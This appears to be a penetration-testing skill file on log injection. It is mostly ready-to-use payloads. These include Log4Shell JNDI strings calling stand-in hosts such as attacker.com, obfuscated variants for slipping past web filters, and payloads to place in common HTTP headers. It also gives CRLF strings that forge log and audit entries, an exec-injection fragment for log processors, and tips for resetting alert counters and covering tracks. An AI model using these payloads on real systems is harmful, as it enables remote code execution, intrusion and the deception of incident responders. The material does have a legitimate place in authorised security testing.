---
name: log-injection
description: Log injection and log forging attacks including Log4Shell, CRLF log injection, and monitoring system bypass
---

# Log Injection

Log injection allows attackers to insert fake log entries, forge audit trails, exfiltrate data through logging channels, or exploit vulnerable logging frameworks. Log4Shell (CVE-2021-44228) demonstrated that logging sinks can be RCE vectors via JNDI lookups.

## Attack Surface

**Log Types**
- Application logs (access, error, debug, audit)
- Server logs (Apache/Nginx access logs)
- Authentication/security logs
- SIEM/monitoring system ingestion
- Cloud logging (CloudWatch, Stackdriver, Azure Monitor)
- Centralized log management (ELK, Splunk, Graylog)

**Injection Points**
- HTTP headers: User-Agent, Referer, X-Forwarded-For, Host
- URL path and query parameters
- POST body fields
- Authentication inputs (username, password)
- Cookie values
- Custom headers logged by application

## Log4Shell (CVE-2021-44228)

The most critical log injection: Java Log4j 2.x executes JNDI lookups in logged strings.

### Detection Payloads

```
# Basic JNDI LDAP
${jndi:ldap://BURP_COLLABORATOR/a}
${jndi:ldap://attacker.com/a}

# DNS-only (safer confirmation)
${jndi:dns://attacker.com/log4shell}

# Obfuscated variants (bypass WAF/filters)
${${lower:j}ndi:${lower:l}dap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}
${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}
${j${::-n}di:ldap://attacker.com/a}
${j${lower:n}di:ldap://attacker.com/a}
${${upper:j}ndi:ldap://attacker.com/a}
${${::-J}${::-N}${::-D}${::-I}:${::-L}${::-D}${::-A}${::-P}://attacker.com/a}

# Alternative protocols
${jndi:rmi://attacker.com/a}
${jndi:ldaps://attacker.com/a}
${jndi:iiop://attacker.com/a}
${jndi:corba://attacker.com/a}
${jndi:dns://attacker.com/a}

# In HTTP headers
User-Agent: ${jndi:ldap://attacker.com/a}
X-Forwarded-For: ${jndi:ldap://attacker.com/a}
Referer: ${jndi:ldap://attacker.com/a}
Authorization: Bearer ${jndi:ldap://attacker.com/a}
X-Api-Version: ${jndi:ldap://attacker.com/a}
```

### Affected Versions
- Log4j 2.0-beta9 to 2.14.1 (original Log4Shell)
- Log4j 2.15.0 (partial fix, CVE-2021-45046)
- Log4j 2.16.0 (disables JNDI by default)
- Log4j 2.17.0 (fixes DoS CVE-2021-45105)
- **Fixed**: 2.17.1 (Java 8), 2.12.4 (Java 7), 2.3.2 (Java 6)

## CRLF Log Injection

Insert newlines to create fake log entries:

```
# Basic
GET /%0d%0a127.0.0.1 - admin [01/Jan/2024] "GET /admin HTTP/1.1" 200 0
# Creates fake log: 127.0.0.1 - admin accessed /admin

# More complex forging
X-Forwarded-For: 1.2.3.4%0d%0a10.0.0.1 - admin - [01/Jan/2024:00:00:00] "GET /secret HTTP/1.1" 200

# Forge audit entries
Username: john%0A2024-01-01 00:00:00 INFO [AUTH] User admin logged in successfully
```

## Log Injection for Data Exfiltration

When logs are forwarded to monitoring systems:

```
# Inject log events that exfiltrate data
# If log processor evaluates expressions (Splunk SPL, ELK painless scripts):
User-Agent: ') | eval x=exec("id") | where...

# LogStash Groovy injection (CVE-2014-8682)
# ELK Kibana SSTI via stored log data
```

## Monitoring System Bypass

```
# If security events are triggered by log patterns:
# "Failed login" → alert after N times

# Inject fake successful login to reset counter:
Username: admin\n2024-01-01 00:00:00 INFO Login successful for admin

# Inject fake log to cover tracks:
Username: attacker\n[previous malicious log entry removed]
```

## Testing Methodology

1. **Test Log4Shell** — Inject `${jndi:dns://COLLABORATOR/a}` in all HTTP headers (User-Agent, Referer, X-Forwarded-For, custom headers) and form fields
2. **Test CRLF** — Inject `%0d%0a` in URL params, headers, form fields — check if reflected in server logs or response
3. **Identify logging technology** — Error messages, `X-Powered-By`, framework banners revealing Java/Log4j
4. **Test all input vectors** — Every field that might be logged: username, search, comments, profile fields
5. **Check monitoring** — Does injected log text appear in admin log viewers?

## Validation

1. For Log4Shell: OAST DNS/HTTP callback confirming the JNDI lookup was processed
2. For CRLF: show the fake log entry was inserted (visible in logs, or response reflects it)
3. For RCE via Log4Shell: show `id` or `hostname` output (only if explicitly in scope)

## False Positives

- Log4j version ≥ 2.17.1 with JNDI disabled
- Input sanitized before logging (newlines stripped)
- Logging of raw bytes vs. interpreted strings
- JNDI lookups allowed but no outbound network access

## Impact

- RCE via Log4Shell on vulnerable Java applications
- Audit trail forgery hiding attacker activity
- Fake security event injection bypassing alerting
- Data exfiltration through logging channels
- Log4Shell in monitoring agents: lateral movement to security infrastructure

## Pro Tips

1. Log4Shell in User-Agent is the most commonly missed vector — always test it
2. Use interactsh or Burp Collaborator for DNS callbacks to confirm Log4Shell without triggering RCE
3. Even patched Log4j may have old instances in Docker containers, microservices, or dependencies
4. Check Struts, Spring, VMware, Cisco products — all historically Log4j-dependent
5. CRLF injection in log files can falsify compliance evidence — emphasize audit integrity impact
6. ELK Stack storing attacker-controlled data + Kibana XSS = stored XSS in security dashboard
7. Test search/filter fields in admin panels — these are often logged server-side with raw input

## Summary

Log injection ranges from CRLF entry forgery (audit manipulation) to Log4Shell (critical RCE). Test Log4Shell payloads via OAST in all HTTP headers, not just the request body. CRLF injection creates fake log entries that help attackers cover tracks and mislead incident responders.
